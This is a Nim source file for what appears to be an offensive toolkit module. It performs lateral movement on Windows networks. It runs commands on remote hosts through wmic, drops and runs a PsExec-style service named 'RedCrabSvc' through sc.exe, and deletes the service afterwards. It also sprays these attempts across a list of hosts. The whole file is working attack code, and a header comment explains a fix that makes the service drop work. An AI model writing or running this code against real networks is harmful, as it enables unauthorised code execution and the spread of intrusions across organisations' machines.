# lateral.nim — lateral movement via SMB/WMI exec + PsExec-style service drop
#
# Bug fix (lateral.rs:33): sc command passed "binPath=" and binary_path as
# *separate* args which is wrong — sc.exe requires them concatenated.
# Fixed: use "binPath=" & binaryPath as a single argument string.

import std/[osproc, strutils]

proc wmiExec*(host, cmd: string): string =
  let (output, exitCode) = execCmdEx(
    "wmic /node:" & host & " process call create " & cmd)
  if exitCode != 0 or output.contains("Error"):
    "WMI exec failed: " & output
  else:
    output

proc smbExec*(host, binaryPath, svcName: string): string =
  # Fixed: "binPath=" & binaryPath is a single arg (was two separate args in Rust)
  let (createOut, createCode) = execCmdEx(
    "sc \\\\" & host & " create " & svcName &
    " binPath=" & binaryPath & " start=demand")
  if createCode != 0:
    return "sc create failed: " & createOut

  let (startOut, startCode) = execCmdEx(
    "sc \\\\" & host & " start " & svcName)

  # Cleanup — always attempt
  discard execCmdEx("sc \\\\" & host & " stop " & svcName)
  discard execCmdEx("sc \\\\" & host & " delete " & svcName)

  if startCode == 0:
    "SMB exec ok on " & host
  else:
    "sc start failed: " & startOut

proc spray*(hosts: seq[string], cmd, binaryPath: string): string =
  var report = ""
  for host in hosts:
    let res = wmiExec(host, cmd)
    let line =
      if not res.contains("failed"):
        "[WMI OK] " & host & ": " & res
      else:
        let smbRes = smbExec(host, binaryPath, "RedCrabSvc")
        if not smbRes.contains("failed"):
          "[SMB OK] " & host & ": " & smbRes
        else:
          "[FAIL] " & host & ": WMI=" & res & " SMB=" & smbRes
    report &= line & "\n"
  report

proc parseHostList*(raw: seq[byte]): seq[string] =
  let s = cast[string](raw)
  for line in s.splitLines():
    let t = line.strip()
    if t.len > 0:
      result.add(t)
